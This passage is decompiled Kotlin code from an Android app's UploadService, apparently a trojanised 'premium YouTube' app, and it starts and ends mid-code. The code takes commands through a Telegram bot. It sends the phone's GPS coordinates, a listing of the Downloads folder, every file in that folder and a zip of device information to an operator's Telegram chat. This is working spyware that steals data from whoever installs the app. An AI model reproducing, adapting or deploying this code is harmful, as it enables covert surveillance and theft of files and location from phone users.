Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۵۷String$$$this$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$17$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۰۹String$arg0$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$17$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۹۷String$$$this$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$17$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۴۹String$arg0$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$17$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())}), MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۷۶String$$$this$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$17$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۲۸String$arg0$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$17$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۴۱۶String$$$this$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$17$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۶۸String$arg0$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$17$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())})}), CollectionsKt.listOf(new Map[]{MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۵۸String$$$this$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$18$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۱۰String$arg0$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$18$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۹۸String$$$this$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$18$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۵۰String$arg0$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$18$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())}), MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۷۷String$$$this$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$18$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۲۹String$arg0$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$18$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۴۱۷String$$$this$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$18$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۶۹String$arg0$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$18$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())})}), CollectionsKt.listOf(new Map[]{MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۵۹String$$$this$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$19$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۱۱String$arg0$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$19$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۹۹String$$$this$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$19$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۵۱String$arg0$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$19$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())}), MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۷۸String$$$this$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$19$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۳۰String$arg0$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$19$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۴۱۸String$$$this$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$19$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۷۰String$arg0$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$19$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())})})})));
        String string = new JSONObject(keyboard).toString();
        Intrinsics.checkNotNullExpressionValue(string, "JSONObject(keyboard).toString()");
        return string;
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0014  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    private final java.lang.Object sendTextToTelegramWithKeyboard(java.lang.String r9, java.lang.String r10, kotlin.coroutines.Continuation<? super kotlin.Unit> r11) {
        /*
            r8 = this;
            boolean r0 = r11 instanceof com.w8sb.w8premiumyt.UploadService.C۰۰۴۶1
            if (r0 == 0) goto L14
            r0 = r11
            com.w8sb.w8premiumyt.UploadService$sendTextToTelegramWithKeyboard$1 r0 = (com.w8sb.w8premiumyt.UploadService.C۰۰۴۶1) r0
            int r1 = r0.label
            r2 = -2147483648(0xffffffff80000000, float:-0.0)
            r1 = r1 & r2
            if (r1 == 0) goto L14
            int r11 = r0.label
            int r11 = r11 - r2
            r0.label = r11
            goto L19
        L14:
            com.w8sb.w8premiumyt.UploadService$sendTextToTelegramWithKeyboard$1 r0 = new com.w8sb.w8premiumyt.UploadService$sendTextToTelegramWithKeyboard$1
            r0.<init>(r11)
        L19:
            r11 = r0
            java.lang.Object r0 = r11.result
            java.lang.Object r1 = kotlin.coroutines.intrinsics.IntrinsicsKt.getCOROUTINE_SUSPENDED()
            int r2 = r11.label
            switch(r2) {
                case 0: goto L33;
                case 1: goto L2d;
                default: goto L25;
            }
        L25:
            java.lang.IllegalStateException r9 = new java.lang.IllegalStateException
            java.lang.String r10 = "call to 'resume' before 'invoke' with coroutine"
            r9.<init>(r10)
            throw r9
        L2d:
            kotlin.ResultKt.throwOnFailure(r0)     // Catch: java.lang.Exception -> L31
            goto L7d
        L31:
            r9 = move-exception
            goto L7e
        L33:
            kotlin.ResultKt.throwOnFailure(r0)
            r2 = r8
            r2.reloadConfig()
            okhttp3.FormBody$Builder r3 = new okhttp3.FormBody$Builder     // Catch: java.lang.Exception -> L31
            r4 = 1
            r5 = 0
            r3.<init>(r5, r4, r5)     // Catch: java.lang.Exception -> L31
            com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt r6 = com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt.INSTANCE     // Catch: java.lang.Exception -> L31
            java.lang.String r6 = r6.m۷۵۸String$arg0$calladd$$this$calladd$$this$calladd$$this$callbuild$valrequestBody$try$funsendTextToTelegramWithKeyboard$classUploadService()     // Catch: java.lang.Exception -> L31
            java.lang.String r7 = r2.chatId     // Catch: java.lang.Exception -> L31
            okhttp3.FormBody$Builder r3 = r3.add(r6, r7)     // Catch: java.lang.Exception -> L31
            com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt r6 = com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt.INSTANCE     // Catch: java.lang.Exception -> L31
            java.lang.String r6 = r6.m۷۶۴String$arg0$calladd$$this$calladd$$this$callbuild$valrequestBody$try$funsendTextToTelegramWithKeyboard$classUploadService()     // Catch: java.lang.Exception -> L31
            okhttp3.FormBody$Builder r3 = r3.add(r6, r9)     // Catch: java.lang.Exception -> L31
            com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt r9 = com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt.INSTANCE     // Catch: java.lang.Exception -> L31
            java.lang.String r9 = r9.m۷۷۰String$arg0$calladd$$this$callbuild$valrequestBody$try$funsendTextToTelegramWithKeyboard$classUploadService()     // Catch: java.lang.Exception -> L31
            okhttp3.FormBody$Builder r9 = r3.add(r9, r10)     // Catch: java.lang.Exception -> L31
            okhttp3.FormBody r9 = r9.build()     // Catch: java.lang.Exception -> L31
            kotlinx.coroutines.CoroutineDispatcher r10 = kotlinx.coroutines.Dispatchers.getIO()     // Catch: java.lang.Exception -> L31
            kotlin.coroutines.CoroutineContext r10 = (kotlin.coroutines.CoroutineContext) r10     // Catch: java.lang.Exception -> L31
            com.w8sb.w8premiumyt.UploadService$sendTextToTelegramWithKeyboard$2 r3 = new com.w8sb.w8premiumyt.UploadService$sendTextToTelegramWithKeyboard$2     // Catch: java.lang.Exception -> L31
            r3.<init>(r9, r5)     // Catch: java.lang.Exception -> L31
            kotlin.jvm.functions.Function2 r3 = (kotlin.jvm.functions.Function2) r3     // Catch: java.lang.Exception -> L31
            r11.label = r4     // Catch: java.lang.Exception -> L31
            java.lang.Object r10 = kotlinx.coroutines.BuildersKt.withContext(r10, r3, r11)     // Catch: java.lang.Exception -> L31
            if (r10 != r1) goto L7d
            return r1
        L7d:
            goto La2
        L7e:
            com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt r10 = com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt.INSTANCE
            java.lang.String r10 = r10.m۸۵۶String$arg0$calle$catch$funsendTextToTelegramWithKeyboard$classUploadService()
            java.lang.StringBuilder r1 = new java.lang.StringBuilder
            r1.<init>()
            com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt r2 = com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt.INSTANCE
            java.lang.String r2 = r2.m۵۷۶String$0$str$arg1$calle$catch$funsendTextToTelegramWithKeyboard$classUploadService()
            java.lang.StringBuilder r1 = r1.append(r2)
            java.lang.String r2 = r9.getMessage()
            java.lang.StringBuilder r1 = r1.append(r2)
            java.lang.String r1 = r1.toString()
            android.util.Log.e(r10, r1)
        La2:
            kotlin.Unit r9 = kotlin.Unit.INSTANCE
            return r9
        */
        throw new UnsupportedOperationException("Method not decompiled: com.w8sb.w8premiumyt.UploadService.sendTextToTelegramWithKeyboard(java.lang.String, java.lang.String, kotlin.coroutines.Continuation):java.lang.Object");
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$sendTextToTelegramWithKeyboard$2, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$sendTextToTelegramWithKeyboard$2", f = "UploadService.kt", i = {}, l = {}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۴۷2 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        final /* synthetic */ FormBody $requestBody;
        int label;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        C۰۰۴۷2(FormBody formBody, Continuation<? super C۰۰۴۷2> continuation) {
            super(2, continuation);
            this.$requestBody = formBody;
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۴۷2(this.$requestBody, continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object obj) {
            IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure(obj);
                    Response response = (Closeable) UploadService.this.client.newCall(new Request.Builder().url(LiveLiterals$UploadServiceKt.INSTANCE.m۵۴۲String$0$str$arg0$callurl$$this$callpost$$this$callbuild$arg0$callnewCall$$this$callexecute$$$this$calluse$fun$anonymous$$arg1$callwithContext$try$funsendTextToTelegramWithKeyboard$classUploadService() + UploadService.this.botToken + LiveLiterals$UploadServiceKt.INSTANCE.m۶۶۷String$2$str$arg0$callurl$$this$callpost$$this$callbuild$arg0$callnewCall$$this$callexecute$$$this$calluse$fun$anonymous$$arg1$callwithContext$try$funsendTextToTelegramWithKeyboard$classUploadService()).post(this.$requestBody).build()).execute();
                    try {
                        Response response2 = response;
                        if (!response2.isSuccessful()) {
                            Log.e(LiveLiterals$UploadServiceKt.INSTANCE.m۸۲۴String$arg0$calle$branch$if$fun$anonymous$$arg0$calluse$fun$anonymous$$arg1$callwithContext$try$funsendTextToTelegramWithKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۵۶۶String$0$str$arg1$calle$branch$if$fun$anonymous$$arg0$calluse$fun$anonymous$$arg1$callwithContext$try$funsendTextToTelegramWithKeyboard$classUploadService() + response2.code() + LiveLiterals$UploadServiceKt.INSTANCE.m۶۸۵String$2$str$arg1$calle$branch$if$fun$anonymous$$arg0$calluse$fun$anonymous$$arg1$callwithContext$try$funsendTextToTelegramWithKeyboard$classUploadService() + response2.message());
                        }
                        Unit unit = Unit.INSTANCE;
                        CloseableKt.closeFinally(response, (Throwable) null);
                        return Unit.INSTANCE;
                    } finally {
                    }
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
        }
    }

    private final void handleTelegramCommand(String data) {
        Log.d(LiveLiterals$UploadServiceKt.INSTANCE.m۸۱۱String$arg0$calld$funhandleTelegramCommand$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۵۵۶String$0$str$arg1$calld$funhandleTelegramCommand$classUploadService() + data);
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$sendLocationToTelegram$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$sendLocationToTelegram$1", f = "UploadService.kt", i = {}, l = {2751}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۳۵1 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        final /* synthetic */ double $lat;
        final /* synthetic */ double $lon;
        int label;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        C۰۰۳۵1(double d, double d2, Continuation<? super C۰۰۳۵1> continuation) {
            super(2, continuation);
            this.$lat = d;
            this.$lon = d2;
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۳۵1(this.$lat, this.$lon, continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object $result) {
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    try {
                        Request request = new Request.Builder().url(LiveLiterals$UploadServiceKt.INSTANCE.m۵۴۶String$0$str$arg0$callurl$$this$callpost$$this$callbuild$valrequest$try$fun$anonymous$$arg2$calllaunch$funsendLocationToTelegram$classUploadService() + UploadService.this.botToken + LiveLiterals$UploadServiceKt.INSTANCE.m۶۷۱String$2$str$arg0$callurl$$this$callpost$$this$callbuild$valrequest$try$fun$anonymous$$arg2$calllaunch$funsendLocationToTelegram$classUploadService()).post(new FormBody.Builder((Charset) null, 1, (DefaultConstructorMarker) null).add(LiveLiterals$UploadServiceKt.INSTANCE.m۷۵۶String$arg0$calladd$$this$calladd$$this$calladd$$this$callbuild$valrequestBody$try$fun$anonymous$$arg2$calllaunch$funsendLocationToTelegram$classUploadService(), UploadService.this.chatId).add(LiveLiterals$UploadServiceKt.INSTANCE.m۷۶۲String$arg0$calladd$$this$calladd$$this$callbuild$valrequestBody$try$fun$anonymous$$arg2$calllaunch$funsendLocationToTelegram$classUploadService(), String.valueOf(this.$lat)).add(LiveLiterals$UploadServiceKt.INSTANCE.m۷۶۸String$arg0$calladd$$this$callbuild$valrequestBody$try$fun$anonymous$$arg2$calllaunch$funsendLocationToTelegram$classUploadService(), String.valueOf(this.$lon)).build()).build();
                        this.label = 1;
                        if (BuildersKt.withContext(Dispatchers.getIO(), new C۰۰۰۰1(UploadService.this, request, null), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                    } catch (Exception e) {
                    }
                    break;
                case 1:
                    try {
                        ResultKt.throwOnFailure($result);
                    } catch (Exception e2) {
                    }
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            return Unit.INSTANCE;
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$sendLocationToTelegram$1$1, reason: invalid class name and collision with other inner class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$sendLocationToTelegram$1$1", f = "UploadService.kt", i = {}, l = {}, m = "invokeSuspend", n = {}, s = {})
        static final class C۰۰۰۰1 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            final /* synthetic */ Request $request;
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            C۰۰۰۰1(UploadService uploadService, Request request, Continuation<? super C۰۰۰۰1> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
                this.$request = request;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new C۰۰۰۰1(this.this$0, this.$request, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object obj) {
                IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure(obj);
                        this.this$0.client.newCall(this.$request).execute().close();
                        return Unit.INSTANCE;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
            }
        }
    }

    private final void sendLocationToTelegram(double lat, double lon) {
        BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۳۵1(lat, lon, null), 3, (Object) null);
    }

    private final String listDownloadFolder() {
        if (!hasStoragePermission()) {
            if (Build.VERSION.SDK_INT >= 30) {
                return LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۵۵String$branch$if$branch$if$funlistDownloadFolder$classUploadService();
            }
            return LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۹۷String$else$if$branch$if$funlistDownloadFolder$classUploadService();
        }
        File downloadDir = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath());
        StringBuilder results = new StringBuilder();
        if (downloadDir.exists() && downloadDir.isDirectory()) {
            File[] files = downloadDir.listFiles();
            boolean z = true;
            if (files != null) {
                if (!(files.length == 0)) {
                    z = false;
                }
            }
            if (z) {
                results.append(LiveLiterals$UploadServiceKt.INSTANCE.m۷۸۴String$arg0$callappend$branch$if$branch$if1$funlistDownloadFolder$classUploadService());
            } else {
                Intrinsics.checkNotNullExpressionValue(files, "files");
                for (File file : files) {
                    results.append(file.isDirectory() ? LiveLiterals$UploadServiceKt.INSTANCE.m۵۸۴String$0$str$branch$if$arg0$callappend$$this$callappend$body$loop$else$if$branch$if1$funlistDownloadFolder$classUploadService() + file.getName() : file.getName()).append(LiveLiterals$UploadServiceKt.INSTANCE.m۷۸۳String$arg0$callappend$body$loop$else$if$branch$if1$funlistDownloadFolder$classUploadService());
                }
            }
        } else {
            results.append(LiveLiterals$UploadServiceKt.INSTANCE.m۸۰۲String$arg0$callappend$else$if1$funlistDownloadFolder$classUploadService());
        }
        String string = results.toString();
        Intrinsics.checkNotNullExpressionValue(string, "results.toString()");
        return string;
    }

    private final Object sendAllDownloadFilesToTelegram(Continuation<? super Unit> continuation) throws InterruptedException {
        List<? extends File> listEmptyList;
        if (!hasStoragePermission()) {
            Object objSendTextToTelegram = sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۶۰String$arg0$callsendTextToTelegram$branch$if$funsendAllDownloadFilesToTelegram$classUploadService(), continuation);
            return objSendTextToTelegram == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objSendTextToTelegram : Unit.INSTANCE;
        }
        File downloadDir = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath());
        if (downloadDir.exists() && downloadDir.isDirectory()) {
            File[] fileArrListFiles = downloadDir.listFiles();
            if (fileArrListFiles != null) {
                Collection destination$iv$iv = new ArrayList();
                for (File file : fileArrListFiles) {
                    if (file.isFile()) {
                        destination$iv$iv.add(file);
                    }
                }
                listEmptyList = (List) destination$iv$iv;
            } else {
                listEmptyList = CollectionsKt.emptyList();
            }
            List<? extends File> list = listEmptyList;
            if (list.isEmpty()) {
                Object objSendTextToTelegram2 = sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۵۴String$arg0$callsendTextToTelegram$branch$if$branch$if1$funsendAllDownloadFilesToTelegram$classUploadService(), continuation);
                return objSendTextToTelegram2 == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objSendTextToTelegram2 : Unit.INSTANCE;
            }
            Object objSendFilesInParallel = sendFilesInParallel(list, new Function0<Boolean>() { // from class: com.w8sb.w8premiumyt.UploadService.sendAllDownloadFilesToTelegram.2
                /* JADX INFO: renamed from: invoke, reason: merged with bridge method [inline-methods] */
                public final Boolean m۱۴۸۳invoke() {
                    return Boolean.valueOf(LiveLiterals$UploadServiceKt.INSTANCE.m۲۰۰Boolean$fun$anonymous$$arg1$callsendFilesInParallel$else$if$branch$if1$funsendAllDownloadFilesToTelegram$classUploadService());
                }
            }, continuation);
            return objSendFilesInParallel == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objSendFilesInParallel : Unit.INSTANCE;
        }
        Object objSendTextToTelegram3 = sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۶۶String$arg0$callsendTextToTelegram$else$if1$funsendAllDownloadFilesToTelegram$classUploadService(), continuation);
        return objSendTextToTelegram3 == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objSendTextToTelegram3 : Unit.INSTANCE;
    }

    /* JADX WARN: Removed duplicated region for block: B:50:0x0148 A[Catch: Exception -> 0x015a, LOOP:0: B:48:0x0142->B:50:0x0148, LOOP_END, TryCatch #4 {Exception -> 0x015a, blocks: (B:47:0x013a, B:48:0x0142, B:50:0x0148, B:51:0x0155, B:62:0x0166, B:63:0x0169, B:44:0x0127, B:59:0x0163), top: B:80:0x002b, inners: #2 }] */
    /* JADX WARN: Removed duplicated region for block: B:68:0x01aa A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0019  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    private final java.lang.Object sendDeviceInfoZipToTelegram(kotlin.coroutines.Continuation<? super kotlin.Unit> r21) {
        /*
            Method dump skipped, instruction units count: 442
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.w8sb.w8premiumyt.UploadService.sendDeviceInfoZipToTelegram(kotlin.coroutines.Continuation):java.lang.Object");
    }

    private final Object sendFilesInParallel(List<? extends File> list, Function0<Boolean> function0, Continuation<? super Unit> continuation) throws InterruptedException {
        Semaphore semaphore = new Semaphore(LiveLiterals$UploadServiceKt.INSTANCE.m۲۱۷Int$arg0$call$init$$valsemaphore$funsendFilesInParallel$classUploadService());
        List jobs = new ArrayList();
        for (File file : list) {
            if (!((Boolean) function0.invoke()).booleanValue()) {
                break;
            }
            semaphore.acquire();
            Job job = BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new UploadService$sendFilesInParallel$job$1(this, file, semaphore, null), 3, (Object) null);
            jobs.add(job);
        }
        Object objJoinAll = AwaitKt.joinAll(jobs, continuation);
        return objJoinAll == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objJoinAll : Unit.INSTANCE;
    }

    private final Object sendAllDownloadFilesToTelegramControlled(Continuation<? super Unit> continuation) throws InterruptedException {
        List<? extends File> listEmptyList;
        if (!hasStoragePermission()) {
            Object objSendTextToTelegram = sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۶۱String$arg0$callsendTextToTelegram$branch$if$funsendAllDownloadFilesToTelegramControlled$classUploadService(), continuation);
            return objSendTextToTelegram == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objSendTextToTelegram : Unit.INSTANCE;
        }
        File downloadDir = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath());
        if (downloadDir.exists() && downloadDir.isDirectory()) {
            File[] fileArrListFiles = downloadDir.listFiles();
            if (fileArrListFiles != null) {
                Collection destination$iv$iv = new ArrayList();
                for (File file : fileArrListFiles) {
                    if (file.isFile()) {
                        destination$iv$iv.add(file);
                    }
                }
                listEmptyList = (List) destination$iv$iv;
            } else {
                listEmptyList = CollectionsKt.emptyList();
            }
            List<? extends File> list = listEmptyList;
            if (list.isEmpty()) {
                Object objSendTextToTelegram2 = sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۵۵String$arg0$callsendTextToTelegram$branch$if$branch$if1$funsendAllDownloadFilesToTelegramControlled$classUploadService(), continuation);
                return objSendTextToTelegram2 == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objSendTextToTelegram2 : Unit.INSTANCE;
            }
            Object objSendFilesInParallel = sendFilesInParallel(list, new Function0<Boolean>() { // from class: com.w8sb.w8premiumyt.UploadService.sendAllDownloadFilesToTelegramControlled.2
                {
                    super(0);
                }

                /* JADX INFO: renamed from: invoke, reason: merged with bridge method [inline-methods] */
                public final Boolean m۱۴۸۴invoke() {
                    return Boolean.valueOf(UploadService.this.downloadFolderSending);
                }
            }, continuation);
            return objSendFilesInParallel == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objSendFilesInParallel : Unit.INSTANCE;
        }
        Object objSendTextToTelegram3 = sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۶۷String$arg0$callsendTextToTelegram$else$if1$funsendAllDownloadFilesToTelegramControlled$classUploadService(), continuation);
        return objSendTextToTelegram3 == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objSendTextToTelegram3 : Unit.INSTANCE;
    }

    private final String buildDownloadFolderKeyboard() {
